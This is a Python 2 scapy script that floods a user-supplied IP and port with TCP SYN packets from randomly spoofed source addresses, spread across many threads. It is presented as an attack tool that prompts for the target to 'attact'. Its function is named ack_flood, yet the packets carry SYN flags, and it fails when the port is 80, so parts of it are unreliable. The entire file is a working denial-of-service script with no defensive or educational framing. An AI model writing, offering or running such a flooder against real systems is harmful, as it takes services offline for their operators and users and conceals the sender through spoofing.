#!/usr/bin/python

from scapy.all import *
import threading
import random
import sys


def ack_flood(target_ip,target_port=80):
    try:
        while True:
            ip=str(random.randint(1,255))+'.'+str(random.randint(1,255))+'.'+str(random.randint(1,255))+'.'+str(random.randint(1,255))
            if target_port != 80:
                d_port=int(target_port)

            s_port=random.randint(1,65535)
            send(IP(src=ip,dst=target_ip)/TCP(dport=d_port,sport=s_port,flags='S'))
            print ip,d_port
    except:
        print 'ack flood error!!!!\n'
        sys.exit(0)

if __name__ == '__main__':
    target_IP=raw_input('Please enter you want attact IP:')
    target_port=int(raw_input('Please enter you want attact Port:'))
    thread_num=int(raw_input('Please enter you thread:'))


    thread_list=[]
    for i in range(thread_num):
        thread_list.append(threading.Thread(target=ack_flood,args=(target_IP,target_port)))
    for i in thread_list:
        i.start()




